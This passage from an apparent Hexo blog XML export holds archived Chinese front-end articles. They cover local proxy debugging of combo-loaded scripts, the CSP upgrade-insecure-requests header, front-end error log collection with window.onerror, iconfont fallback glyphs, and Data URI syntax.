jekyll 的支持，让谁不想去尝试尝试呢？]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在线调试方案的思考与实践]]></title>
    <url>%2Fblog%2F2015%2F08%2F24%2F2015-08-24-cb-debug-suggest%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本文的要点不在移动端调试上，移动端调试无非就是调试页面和调试工具之间存在分离，消除这种分离并创建连结就能解决移动端的调试问题。重点阐述的是所见即所得的调试模式下会遇到的阻碍。当我们打开网页，发现一个模块没有正确地渲染或者空白时，如果控制台有报错，会直接根据报错定位到源码位置开始 debug；如果控制台没有报错，则会根据模块名或者模块特征的一个值，通过全局搜索找到这个模块的位置，然后在调试工具中断点，单步调试，找到问题所在，此时我们可能会这样做：情形一：小A同学打开控制台，发现断点调试不好写代码，于是将压缩的源码复制一份保存到本地，格式化，然后将线上资源通过代理工具代理到本地文件。情形二：小B同学早早的为自己配了一份本地开发环境，于是他遇到问题之后，直接去源码中定位错误位置，由于使用的是预处理语言，所以需要先打包编译之后再在本地预览效果。情形三：小C同学的调试方式是小A和小B的综合版本，将线上的资源代理到本地 build 目录文件，在 src 目录下修改之后编译打包到 build，然后预览。代理调试的烦恼而对于比较复杂的线上环境，代理也会遇到很多障碍，比如：线上资源 combo出现错误的脚本地址为 http://example.com/path/??a.js,b.js,c.js，它对应着 a.js,b.js,c.js 三个脚本文件，如果我们使用 Fiddler/Charles 这样的经典代理工具调试代码，就必须给这些工具编写插件，或者在替换配置里头加一堆判断或者正则，成本高，门槛高。线上代码压缩打包压缩，这是上线之前的必经流程。由于我们在打包的环节中并没有考虑为代码添加 sourceMap，而线上之前对应 index-min.js 的 index.js 也因为安全方面的原因给干掉了，这给我们调试代码造成了极大的不便利。代码依赖较多，拉取代码问题很多时候，我们的页面依赖了多个 asserts 资源，而这些资源各自分布在多个仓库之中，甚至分布在不同的发布平台上，为了能够在源码上清晰的调试代码，我们不得不将所有的资源下载到本地，期间一旦存在下载代码的权限问题，整个调试进度就慢下来，这是十分不能忍受的事情。比如某系统构建的页面，页面上的模块都是以仓库为维度区分的，一个页面可能对应了5-50个仓库，下载代码实为麻烦。最可怕的调试是，本地没有对应的测试环境、代理工具又不满足我们的需求，然后就只能，编辑代码-&gt;打包压缩-&gt;提交代码-&gt;查看效果-&gt;编辑代码-&gt;…，如果你的项目开发是这种模式，请停下来，思考调试优化方案，正所谓磨刀不误砍柴工。开启懒人调试模式当看到线上出现问题（可能是其他同学负责页面的问题），脑中浮出这样的场景： 1234567 我：&quot;嘿，线上有问题啦！我要调试代码！&quot;电脑：&quot;好的，主人。请问是哪个页面？&quot;（弹出浮层） 我：浮层中输入URL。电脑：&quot;请问是哪个地方出问题了？&quot; 我：（指着电脑）&quot;模块A和模块B。&quot;电脑：正在下载A、B资源...正在将上线A、B映射到本地...自动打开A、B对应文件夹 我：编辑代码，然后实时预览效果。 在这里我们需要解决这样几个问题将页面对应的所有仓库/资源罗列在用户面前下载资源的权限提示和权限处理线上资源解 combo，然后映射到本地当然调试之后，可以还有一个操作： 12 我：&quot;哈，已经修复了，帮我提交代码~&quot;电脑：正在diff代码...收到确认提交信号，提交到预发环境...收到已经预览信号...正在发布代码...收到线上回归信号...流程结束 除了 debug 代码，我们需要做的就只是用眼睛看效果是否 ok，整个流程优化下来，体验是很赞的！解决代理遇到的问题上面我们提到了三个问题，平时开发遇到最头疼的一个是 combo，曾经我们页面上的代码加一个 ?_xxx 参数就能够直接开始调试模式，那是因为程序的入口只有一个，而且所有脚本的依赖也打包到一个叫做 deps.js 文件中，加上调试参数之后，可以将原来 combo 加载的文件: http://example.com/path/??a-min.js,b-min.js,c-min.js，按照非 combo 的方式加载： 123http://example.com/path/a.jshttp://example.com/path/b.jshttp://example.com/path/c.js 上面的代码可以轻松地代理到本地，但是有的系统生成的代码并没有 deps.js 文件，它是将脚本直接输出到页面上： 1&lt;script src=&quot;http://example.com/path/??a-min.js,b-min.js,c-min.js&quot;&gt;&lt;/script&gt; 解决 combo 问题此时通过 Fiddler/Charles 工具比较难满足需求，对于这个问题有两个处理方案：1). 浏览器请求全部代理到本地的一个服务首先写一个本地服务： 1234567891011121314151617var http = require(&apos;http&apos;);// npm i http-proxy --savevar httpProxy = require(&apos;http-proxy&apos;);var proxy = httpProxy.createProxyServer(&#123;&#125;);var server = http.createServer(function(req, res) &#123; console.log(req.url); if(req.url.indexOf(&quot;??&quot;) &gt; -1)&#123; // combo资源让 3400 端口的服务处理 proxy.web(req, res, &#123; target: &apos;http://127.0.0.1:3400&apos; &#125;); &#125; else &#123; // 直接返回 proxy.web(req, res, &#123; target: req.url &#125;); &#125;&#125;).listen(3399, function()&#123; console.log(&quot;在端口 3399 监听浏览器请求&quot;);&#125;); 代码的意思是，利用 http-proxy 这个 npm 包，代理浏览器的请求，浏览器上使用 switchSharp 设置本地代理为 http://127.0.0.1:3399，当请求过来，先判断 url，如果 url 中包含了 ?? 则将其作为 combo 资源处理，代理给本地的另一个服务 http://127.0.0.1:3400，这个服务收到请求后会将 combo 内容分解成多个，全部请求完之后再吐出来。2). 使用本地服务请求 html 代码，替换 html 代码内容使用强制手段（源码替换）将代码解 combo，比如源码页面为： 123&lt;!-- html code --&gt;&lt;script src=&quot;http://example.com/path/??a-min.js,b-min.js,c-min.js&quot;&gt;&lt;/script&gt;&lt;!-- html code --&gt; 使用本地服务请求这个url，然后转换成： 12345&lt;!-- html code --&gt;&lt;script src=&quot;http://example.com/path/a.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://example.com/path/b.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://example.com/path/c.js&quot;&gt;&lt;/script&gt;&lt;!-- html code --&gt; 实现这个操作的代码： 123456789101112131415161718192021222324252627var http = require(&apos;http&apos;);// npm i request --save;var request = require(&apos;request&apos;);http.createServer(function(req, res)&#123; var path = req.url.slice(req.url.indexOf(&quot;path=&quot;) + 5); console.log(path); if(!path) &#123; res.write(&quot;path is empty&quot;); res.end(); return; &#125; request(path, function (error, response, body) &#123; if (!error &amp;&amp; response.statusCode == 200) &#123; console.log(body); // 代码替换 body = body.replace(&apos;&lt;script src=&quot;http://example.com/path/??a-min.js,b-min.js,c-min.js&quot;&gt;&lt;/script&gt;&apos;, &apos;&lt;script src=&quot;http://example.com/path/a.js&quot;&gt;&lt;/script&gt;\ &lt;script src=&quot;http://example.com/path/b.js&quot;&gt;&lt;/script&gt;\ &lt;script src=&quot;http://example.com/path/c.js&quot;&gt;&lt;/script&gt;&apos; ); res.write(body); res.end(); &#125; &#125;);&#125;).listen(3399, function()&#123; console.log(&quot;listening on port 3399&quot;);&#125;); 比如请求 http://127.0.0.1:3399/?path=http://www.taobao.com，即可拿到淘宝首页的源码，然后对拿到的代码做替换。解决代码压缩问题对于这个问题，建议在线上放两份源码，一份是压缩源码，一份是未压缩源码，当页面 url 存在 debug 参数的时候，返回未压缩版本，正常返回压缩版本。当然，也可以采用上述方式处理问题。不过，更合理的方式应该是 sourceMap，前端没有秘密，压缩代码只是增加了 hacker 的攻击成本，并不妨碍有能力的 hacker 借系统漏洞入侵。所以可以为源码提供一份 sourceMap 文件。 12345678910var gulp = require(&apos;gulp&apos;);var sourcemaps = require(&apos;gulp-sourcemaps&apos;);gulp.task(&apos;javascript&apos;, function() &#123; gulp.src(&apos;src/**/*.js&apos;) .pipe(sourcemaps.init()) //.pipe(xx()) .pipe(sourcemaps.write()) .pipe(gulp.dest(&apos;dist&apos;));&#125;); 关于 sourceMap 的 gulp 插件配置，详情可以戳这里。不仅仅是 JavaScript，CSS 也有 source maps，这个信息可以在 Chrome 控制台的设置选项中看到：代码的拉取如果一个项目只有你知道如何修改，那这个项目的技术设计就有点糟糕了，为了让众人都能处理你项目中的问题，一定要需要一个简洁的模式为开发者快速搭建测试环境，文档是一方面，如果有个一键操作的命令，那就更棒了！ 123456789101112131415161718192021# 启动脚本start: createFile getMod getPage# 创建目录createFile: @[ -d module ] || mkdir module @[ -d page ] || mkdir page# 拉取模块仓库，这里有几十个，比较费时，请耐心等待...getMod: cd module; \ for i in $(MODS); do \ [ -d $(MODPATH)$$i ] || git clone $(MODPATH)$$i; \ git co -b master;\ git co -b $(MODSV); done# 拉取页面仓库，tbindexgetPage: cd page; \ @[ -d tbindex ] || git clone $(PAGEPATH)$PAGE; 上面是一个 MakeFile 的部分代码，作用是创建开发目录，拉取分支信息，然后开始服务器，打开浏览器，使用 IDE 打开目录，万事就绪，只等主人敲代码。整个流程就一两分钟，完成开发之前所有的准备工作。这个脚本不仅仅是给自己使用，如果其他人也需要参与开发，一个命令就能让参与者进入开发模式，加上文档说明，省却了很多沟通成本。在线调试实践(一个系统的调试工具)输入需要调试的页面URL（如 http://www.taobao.com）：插件会分析 DOM，遍历拿到页面所有被引用到的仓库：选择需要调试的模块（颗粒度细分到了html/js/css），点击调试按钮，可以看到调试页面的资源都会引用本地下载的文件。小结优化流程、优化架构是我们矢志不渝坚持的方向，本文主要阐述，编辑代码到调试线上效果的过程，提出了解决 combo 和代码压缩等问题的方案和建议。希望可以给不擅长代理调试的同学一点启示。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让浏览器不再显示 https 页面中的 http 请求警报]]></title>
    <url>%2Fblog%2F2015%2F08%2F21%2F2015-08-21-cb-upgrade-insecure-requests%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. HTTPS 是 HTTP over Secure Socket Layer，以安全为目标的 HTTP 通道，所以在 HTTPS 承载的页面上不允许出现 http 请求，一旦出现就是提示或报错：Mixed Content: The page at “//www.taobao.com/“ was loaded over HTTPS, but requested an insecure image “http://g.alicdn.com/s.gif“. This content should also be served over HTTPS.HTTPS改造之后，我们可以在很多页面中看到如下警报：很多运营对 https 没有技术概念，在填入的数据中不免出现 http 的资源，体系庞大，出现疏忽和漏洞也是不可避免的。CSP设置upgrade-insecure-requests好在 W3C 工作组考虑到了我们升级 HTTPS 的艰难，在 2015 年 4 月份就出了一个 Upgrade Insecure Requests 的草案，他的作用就是让浏览器自动升级请求。在我们服务器的响应头中加入： 1header(&quot;Content-Security-Policy: upgrade-insecure-requests&quot;); 我们的页面是 https 的，而这个页面中包含了大量的 http 资源（图片、iframe等），页面一旦发现存在上述响应头，会在加载 http 资源时自动替换成 https 请求。可以查看 google 提供的一个 demo：不过让人不解的是，这个资源发出了两次请求，猜测是浏览器实现的 bug：当然，如果我们不方便在服务器/Nginx 上操作，也可以在页面中加入 meta 头： 1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt; 目前支持这个设置的还只有 chrome 43.0，不过我相信，CSP 将成为未来 web 前端安全大力关注和使用的内容。而 upgrade-insecure-requests 草案也会很快进入 RFC 模式。 从 W3C 工作组给出的 example，可以看出，这个设置不会对外域的 a 链接做处理，所以可以放心使用。 相关阅读 http://www.w3.org/TR/mixed-content///www.chromestatus.com/feature/6534575509471232]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络交互</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端代码异常日志收集与监控]]></title>
    <url>%2Fblog%2F2015%2F08%2F20%2F2015-08-20-cb-fe-monitor%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 在复杂的网络环境和浏览器环境下，自测、QA测试以及 Code Review 都是不够的，如果对页面稳定性和准确性要求较高，就必须有一套完善的代码异常监控体系，本文从前端代码异常监控的方法和问题着手，尽量全面地阐述错误日志收集各个阶段中可能遇到的阻碍和处理方案。收集日志的方法平时收集日志的手段，可以归类为两个方面，一个是逻辑中的错误判断，为主动判断；一个是利用语言给我们提供的捷径，暴力式获取错误信息，如 try..catch 和 window.onerror。1. 主动判断我们在一些运算之后，得到一个期望的结果，然而结果不是我们想要的 1234567891011// test.jsfunction calc()&#123; // code... return val;&#125;if(calc() !== &quot;someVal&quot;)&#123; Reporter.send(&#123; position: &quot;test.js::&lt;function&gt;calc&quot; msg: &quot;calc error&quot; &#125;);&#125; 这种属于逻辑错误/状态错误的反馈，在接口 status 判断中用的比较多。2. try..catch 捕获判断一个代码段中存在的错误： 123456try &#123; init(); // code...&#125; catch(e)&#123; Reporter.send(format(e));&#125; 以 init 为程序的入口，代码中所有同步执行出现的错误都会被捕获，这种方式也可以很好的避免程序刚跑起来就挂。3. window.onerror捕获全局错误： 12345window.onerror = function() &#123; var errInfo = format(arguments); Reporter.send(errInfo); return true;&#125;; 在上面的函数中返回 return true，错误便不会暴露到控制台中。下面是它的参数信息： 12345678910/** * @param &#123;String&#125; errorMessage 错误信息 * @param &#123;String&#125; scriptURI 出错的文件 * @param &#123;Long&#125; lineNumber 出错代码的行号 * @param &#123;Long&#125; columnNumber 出错代码的列号 * @param &#123;Object&#125; errorObj 错误的详细信息，Anything */window.onerror = function(errorMessage, scriptURI, lineNumber,columnNumber,errorObj) &#123; // code..&#125; window.onerror 算是一种特别暴力的容错手段，try..catch 也是如此，他们底层的实现就是利用 C/C++ 中的 goto 语句实现，一旦发现错误，不管目前的堆栈有多深，不管代码运行到了何处，直接跑到顶层或者 try..catch 捕获的那一层，这种一脚踢开错误的处理方式并不是很好。收集日志存在的问题收集日志的目的是为了及时发现问题，最好日志能够告诉我们，错误在哪里，更优秀的做法是，不仅告诉错误在哪里，还告诉我们，如何处理这个错误。终极目标是，发现错误，自动容错，这一步是最难的。1. 无具体报错信息，Script error.先看下面的例子，test.html 1234567&lt;!-- http://barret/test.html --&gt;&lt;script&gt; window.onerror = function()&#123; console.log(arguments); &#125;;&lt;/script&gt;&lt;script src=&quot;http://barret/test.js&quot;&gt;&lt;/script&gt; test.js 123456// http://barret/test.jsfunction test()&#123; ver a = 1; return a+1;&#125;test(); 我们期望收集到的日志是下面这样具体的信息：为了对资源进行更好的配置和管理，我们通常将静态资源放到异域上 1234567&lt;!-- http://barret/test.html --&gt;&lt;script&gt; window.onerror = function()&#123; console.log(arguments); &#125;;&lt;/script&gt;&lt;script src=&quot;http://localhost/test.js&quot;&gt;&lt;/script&gt; 而拿到的结果却是：翻开 Chromium 的 WebCore 源码，可以看到：跨域情况下，返回的结果是 Script error.。 123456// http://trac.webkit.org/browser/branches/chromium/1453/Source/WebCore/dom/ScriptExecutionContext.cpp#L333String message = errorMessage;int line = lineNumber;String sourceName = sourceURL;// 已经拿到了所有的错误信息，但如果发现是非同源情况，`sanitizeScriptError` 中复写错误信息sanitizeScriptError(message, line, sourceName, cachedScript); 旧版 的 WebCore 中只判断了 securityOrigin()-&gt;canRequest(targetURL)，新版中还多了一个 cachedScript 的判断，可以看出浏览器对这方面的限制越来越严格。在本地测试了下：可见在 file:// 协议下，securityOrigin()-&gt;canRequest(targetURL) 也是 false。为何Script error.?简单报错： Script error，目的是避免数据泄露到不安全的域中，一个简单的例子： 1&lt;script src=&quot;bank.com/login.html&quot;&gt;&lt;/script&gt; 上面我们并没有引入一个 js 文件，而是一个 html，这个 html 是银行的登录页面，如果你已经登录了 bank.com，那 login 页面就会自动跳转到 Welcome xxx…，如果未登录则跳转到 Please Login…，那么 JS 报错也会是 Welcome xxx… is not defined，Please Login… is not defined，通过这些信息可以判断一个用户是否登录他的银行帐号，给 hacker 提供了十分便利的判断渠道，这是相当不安全的。crossOrigin参数跳过跨域限制image 和 script 标签都有 crossorigin 参数，它的作用就是告诉浏览器，我要加载一个外域的资源，并且我信任这个资源。 1&lt;script src=&quot;http://localhost/test.js&quot; crossorigin=&quot;&quot;&gt;&lt;/script&gt; 然而，却报错了：这是意料之中的错误，跨域资源共享策略要求，服务器也设置 Access-Control-Allow-Origin 的响应头： 1header(&apos;Access-Control-Allow-Origin: *&apos;); 回头看看我们 CDN 的资源，Javascript/CSS/Image/Font/SWF 等这些静态资源其实都已经早早地加上了 CORS 响应头。2. 压缩代码无法定位到错误的具体位置线上的代码几乎都是经过打包压缩的，几十上百的文件压缩后打包成一个，而且只有一行。当我们收到 a is not defined 的时候，如果只在特定场景下才报错，我们根本无法定位到这个被压缩的 a 是个什么东西，那么此时的错误日志就是无效的。第一个想到的办法是利用 sourceMap，利用它可以定位到压缩代码某一点在未压缩代码的具体位置。下面是 sourceMap 引入的格式，在代码的最后一行加入： 1//# sourceMappingURL=index.js.map 以前使用的是 “//@” 作为开头，现在使用 “//#”，然而对于错误上报，这玩意儿没啥用。JS 不能拿到他真实的行数，只能通过 Chrome DevTools 这样的工具辅助定位，而且并不是每个线上资源都会添加 sourceMap 文件。sourceMap 的用途目前还只能体现在开发阶段。当然，如果理解了 sourceMap 的 VLQ编码和位置对应关系，也可以将拿到的日志进行二次解析，映射到真实路径位置，这个成本比较高，貌似暂时也没人尝试过。那么，有什么办法，可以定位错误的具体位置，或者说有什么办法可以缩小我们定位问题的难度呢？可以这样考虑：打包的时候，在每两个合并的文件之间加上 1000 个空行，最后上线的文件就会变成 123456789101112131415(function()&#123;var longCode.....&#125;)(); // file 1// 1000 个空行(function()&#123;var longCode.....&#125;)(); // file 2// 1000 个空行(function()&#123;var longCode.....&#125;)(); // file 3// 1000 个空行(function()&#123;var longCode.....&#125;)(); // file 4var _fileConfig = [&apos;file 1&apos;, &apos;file 2&apos;, &apos;file 3&apos;, &apos;file 4&apos;] 如果报错在第 3001 行， 123456window.onerror = function(msg, url, line, col, error)&#123; // line = 3001 var lineNum = line; console.log(&quot;错误位置：&quot; + _fileConfig[parseInt(lineNum / 1000) - 1]); // -&gt; &quot;错误位置：file 3&quot;&#125;; 可以计算出，错误出现在第三个文件中，范围就缩小了很多。3. error 事件的注册多次注册 error 事件，不会重复执行多个回调： 12345var fn = window.onerror = function() &#123; console.log(arguments);&#125;;window.addEventListener(&quot;error&quot;, fn);window.addEventListener(&quot;error&quot;, fn); 触发错误之后，上面代码的结果为：window.onerror 和 addEventListener 都执行了，并只执行了一次。4. 收集日志的量没有必要将所有的错误信息全部送到 Log 中，这个量太大了。如果网页 PV 有 1kw，那么一个必现错误发送的 log 信息将有 1kw 条，大约一个 G 的日志。我们可以给 Reporter 函数添加一个采样率： 1234function needReport (sampling)&#123; // sampling: 0 - 1 return Math.random() &#125; 这个采样率可以按需求来处理，可以同上，使用一个随机数，也可以使用 cookie 中的某个字段（如 nickname）的最后一个字母/数字来判定，也可以将用户的 nickname 进行 hash 计算，再通过最后一位的字母/数字来判断，总之，方法是很多的。收集日志布点位置为了更加精准的拿到错误信息，有效地统计错误日志，我们应该更多地采用主动式埋点，比如在一个接口的请求中： 12345678910111213141516171819202122232425262728// Module A Get Shops Data$.ajax(&#123; url: URL, dataType: &quot;jsonp&quot;, success: function(ret) &#123; if(ret.status === &quot;failed&quot;) &#123; // 埋点 1 return Reporter.send(&#123; category: &quot;WARN&quot;, msg: &quot;Module_A_GET_SHOPS_DATA_FAILED&quot; &#125;); &#125; if(!ret.data || !ret.data.length) &#123; // 埋点 2 return Reporter.send(&#123; category: &quot;WARN&quot;, msg: &quot;Module_A_GET_SHOPS_DATA_EMPTY&quot; &#125;); &#125; &#125;, error: function() &#123; // 埋点 3 Reporter.send(&#123; category: &quot;ERROR&quot;, msg: &quot;Module_A_GET_SHOPS_DATA_ERROR&quot; &#125;); &#125;&#125;); 上面我们精准地布下了三个点，描述十分清晰，这三个点会对我们后续排查线上问题提供十分有利的信息。关于 try..catch 的使用对于 try..catch 的使用，我的建议是：能不用，尽量不要用。JS代码都是自己写出来的，哪里会出现问题，会出现什么问题，心中应该都有个谱，平时用到 try..catch 的一般只有两个地方： 123456789// JSON 格式不对try&#123; JSON.parse(JSONString);&#125;catch(e)&#123;&#125;// 存在不可 decode 的字符try&#123; decodeComponentURI(string);&#125;catch(e)&#123;&#125; 类似这样的错误都是不太可控的。可以在使用到 try..catch 的地方思考是否可以使用其他方式做兼容。感谢 EtherDream 的补充。关于 window.onerror 的使用可以尝试如下代码： 1234567// test.jsthrow new Error(&quot;SHOW ME&quot;);window.onerror = function()&#123; console.log(arguments); // 阻止在控制台中打印错误信息 return true;&#125;; 上面的代码直接报错了，没有继续往下执行。页面中可能有好几个 script 标签，但是 window.onerror 这个错误监听一定要放到最前头！ 错误的警报与提示 什么时候该警报？不能有错就报。上面也说了，因为网络环境和浏览器环境因素，复杂页面我们允许千分之一的错误率。日志处理后的数据图：图中有两根线，橙色线是今日的数据，浅蓝色线是往日平均数据，每隔 10 分钟产生一条记录，横坐标是 0-24 点的时间轴，纵坐标是错误量。可以很明显的看出，在凌晨一两点左右，服务出现了异常，错误信息是平均值的十几倍，那么这个时候就改报警了。报警的条件可以设置得严苛一点，因为误报是件很烦人的事情，短信、邮件、软件等信息轰炸，有的时候还是大半夜。那么，一般满足如下条件可以报警：错误超过阈值，比如 10分钟最多允许 100 个错误，结果超过了 100错误超过平均值的 10 倍，超过平均值就报警，这个逻辑显然不正确，但是超过了平均值的 10 倍，基本可以认定服务出问题了在纳入对比之前，要过滤同 IP 出现的错误，比如一个错误出现在 for 循环或者 while 循环中，再比如一个用户在蹲点抢购，不停的刷新友好的错误提示对比下面两条日志，catch 的错误日志：Uncaught ReferenceError: vd is not defined自定义的错误日志：“生日模块中获取后端接口信息时，eval 解析出错，错误内容为：vd is not defined.”该错误在最近 10 分钟内出现 1000 次，这个错误往日的平均出错量是 50 次 / 10 分钟 网络错误日志工作草案 W3C Web Performance工作组发布了网络错误日志工作草案。该文档定义了一个机制，允许Web站点声明一个网络错误汇报策略，浏览器等用户代理可以利用这一机制，汇报影响资源正确加载的网络错误。该文档还定义了一个错误报告的标准格式及其在浏览器和Web服务器之间的传输机制。 详细草案：http://www.w3.org/TR/2015/WD-network-error-logging-20150305/ 小结 功能、测试和监控是程序开发的三板斧，很多工程师可以将功能做的尽善尽美，也了解一些测试方面的知识，可是在监控这个方向上基本处于大脑空白。错误日志的收集、整理算是监控的一个小部分，但是它对我们了解网站稳定性至关重要。文中有忽略的地方希望读者可以补充，错误的地方还望斧正。 拓展阅读 基于window.onerror事件 建立前端错误日志 by Dx. Yang构建web前端异常监控系统–FdSafe by 石破JavaScript Source Map 详解 by 阮一峰HTML5标准-window.onerrorMSDN-window.onerrorMDN-window.onerror网络错误日志]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iconfont的蜕化操作]]></title>
    <url>%2Fblog%2F2015%2F08%2F17%2F2015-08-17-cb-iconfont-opt%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 很多国外的网站，访问的时候可以看到，页面先是大面积白一下，然后恢复正常。原因是网页上用到了 webfont，这些页面很多情况都是直接引用 google 的 webfont 地址，中华大局域网下，由于网络原因，页面虽已经全部加载，引用的 webfont 资源却还未下载成功，这就导致了使用了 webfont 的内容呈现空白状态，没有被渲染出来。如，访问该网站：http://zurb.com/playground/foundation-icon-fonts-3为啥国内很少有这种事儿发生？英文字符并不多，生成 webfont 所占用的 unicode range 很小，故英文字体的 webfont 体积是很小的。而中文字符却有好几千个，一个完整中文的 webfont 至少有 2-3M，没人会在自己的网站上使用如此庞大的 webfont 的字体。但 webicon 就不一样了，根据页面的需要，只摘取几个 unicode 段位，体积自然也是很小了。为了不影响正常字符的展示，webicon 的制作一般会选用空白的 unicode 段位，这些 unicode 在浏览器下默认展示为 “”，一个乱码的符号。那么同样的问题就出现了，由于 CDN 的服务不太稳定或者用户网络原因，页面打开之后，部分 webicon 的资源还未加载成功，那么那些使用到 webicon 的位置便会出现乱码，如果图标较大，体验是十分不好的。iconfont 制作的基本原理Unicode&thinsp;码表是一个很大的表格，每个表格都对应一个 Unicode 字符，每个字符都有一个 Unicode 码值对应，如 “李” 对应 “\u674e”, “靖” 对应 “\u9756”。因为码表很大，有部分表格并没有对应的字符，但是它有自己的码值。iconfont 的制作，首先将绘制的图形（可以是一张图片、也可以是一个 svg 描述）通过工具或者程序生成文字icon，然后将文字icon对应到码表之中，为了不干预码表中已有的字符，我们通常会把文字icon对应到没有字符的表格中，最后导出我们额外对应的表格信息，生成iconfont。如下图所示： 1234567891011121314151617181920 Unicode 码表 +-----------------+ ... | | | | | | | | 图形icon 文字icon +-----------------++-------+ +------+ | | | ||icon a +----&gt; A +-----------&gt; Ua | |+-------+ +------+ | | | | +-----------------++-------+ +------+ | | | ||icon b +----&gt; B +-----&gt; Ub + | +------&gt; iconfont+-------+ +------+ | | | | +-----------------++-------+ +------+ | | | ||icon C +----&gt; C +-----&gt; Uc | | |+-------+ +------+ | | | | +-----------------+ ... | | | | | | | | +-----------------+ 图中，三个icon分别对应到 Unicode 码表中码值为 Ua Ub Uc 的三个表格，那么最后导出的 iconfont 也就只包含这三个字符信息，这个体积是很小的。延伸阅读：再探@font-face及webIcon制作iconfont 的蜕化处理正常的情况下是一堆漂亮的 icon 图标，而当网络较慢或者 CDN 不稳定的时候，用户看到的是图示乱码的框框，优化之后，用户可以看到我们对 iconfont 的蜕化操作。效果预览： 123# 绑定 hosts2.2.2.2 at.alicdn.com# 然后访问淘宝首页，可以看到效果 了解了iconfont 的制作之后，理解上图就不难了。中间乱码的那张图里，每个图标对应的都是无字符的码表表格，页面默认的字体呈现这些字符的状态就是 “”。这里我们提到的蜕化处理，只需要在对应 Unicode 码表时，将每个图标对应到有字符的码表表格中，就会看到最上层那张图片的效果。有人会问，那些蜕化的图标是从哪里来的？对应的键值又是多少？除了 emoji 外，我们输入法能够输出的所有文字在 web 上也都是能够正常显示的，所谓的正常显示就是不会出现 “”。平时常用的搜狗输入法/百度输入法都提供了很多的特殊字符，我们可以在这些特殊字符中找到最能表现icon的字符，当然，甚至可以使用文字、字母来替代。比如音乐icon可以使用 “♫” 替代，计算字符码值的方式是： 123var code = &quot;♫&quot;.charCodeAt(0).toString(16);// htmlEncodedStr 便可以作为icon的内容var htmlEncodedStr = &quot;&lt;#x&quot; + code + &quot;;&quot;; 以国内目前做的最好的 iconfont 网站为例，演示如何便捷的修改文字icon对应的默认码值:修改完之后保存，此时这个 icon 对应的码值就已经变化了。 ☞&nbsp;小结 很多网站都承载着日均几百上千万的流量，用户的网络环境复杂，每个细节问题都会在部分用户面前暴露无遗，我们要做的就是去优化那些概率性看到的”小问题”，这些”小问题”在庞大的用户群体中会变成一个很大的问题，必须引起重视。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[细说 Data URI]]></title>
    <url>%2Fblog%2F2015%2F08%2F12%2F2015-08-12-cb-data-uri%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. Data URL 早在 1995 年就被提出，那个时候有很多个版本的 Data URL Schema 定义陆续出现在 VRML 之中，随后不久，其中的一个版本被提上了议案&mdash;&mdash;将它做个一个嵌入式的资源放置在 HTML 语言之中。从 RFC 文档定稿的时间来看（1998年），它是一个很受欢迎的发明。Data URIs 定义的内容可以作为小文件被插入到其他文档之中。URI 是 uniform resource identifier 的缩写，它定义了接受内容的协议以及附带的相关内容，如果附带的相关内容是一个地址，那么此时的 URI 也是一个 URL (uniform resource locator)，如： 12ftp://10.1.1.10/path/to/filename.exthttp://example.com/source/id 协议后面的内容，可以告诉客户端一个准确下载资源的地址，而 URI 并不一定包含一个地址信息，如(demo)： 1data:image/gif;base64,R0lGODlhEAAOALMAAOazToeHh0tLS/7LZv/0jvb29t/f3//Ub//ge8WSLf/rhf/3kdbW1mxsbP//mf///yH5BAAAAAAALAAAAAAQAA4AAARe8L1Ekyky67QZ1hLnjM5UUde0ECwLJoExKcppV0aCcGCmTIHEIUEqjgaORCMxIC6e0CcguWw6aFjsVMkkIr7g77ZKPJjPZqIyd7sJAgVGoEGv2xsBxqNgYPj/gAwXEQA7 其协议为 data，并告诉客户端将这个内容作为 image/gif 格式来解析，需要解析的内容使用的是 base64 编码。它直接包含了内容但并没有一个确定的资源地址。格式Data URI 的格式十分简单，如下所示： 1data:[&lt;mime type=&quot;&quot;&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data=&quot;&quot;&gt; 第一部分是 data: 协议头，它标识这个内容为一个 data URI 资源。第二部分是 MIME 类型，表示这串内容的展现方式，比如：text/plain，则以文本类型展示，image/jpeg，以 jpeg 图片形式展示，同样，客户端也会以这个 MIME 类型来解析数据。第三部分是编码设置，默认编码是 charset=US-ASCII, 即数据部分的每个字符都会自动编码为 %xx，关于编码的测试，可以在浏览器地址框输入分别输入下面两串内容，查看效果：12345678// output: &amp;auml;&amp;frac12; &amp;aring;&amp;yen;&amp;frac12; -&gt; 使用默认的编码展示，故乱码data:text/html,你好// output: 你好 -&gt; 使用 UTF-8 展示data:text/html;charset=UTF-8,你好// output: 浣犲ソ -&gt; 使用 gbk 展示（浏览器默认编码 UTF-8，故乱码）data:text/html;charset=gbk,你好// output: 你好 -&gt; UTF-8 编码，内容先使用 base64 解码，然后展示data:text/html;charset=UTF-8;base64,5L2g5aW9第四部分是 base64 编码设定，这是一个可选项，base64 编码中仅包含 0-9,a-z,A-Z,+,/,=，其中 = 是用来编码补白的。最后一部分为这个 Data URI 承载的内容，它可以是纯文本编写的内容，也可以是经过 base64编码 的内容。很多时候我们使用 data URI 来呈现一些较长的内容，如一串二进制数据编码、图片等，采用 base64 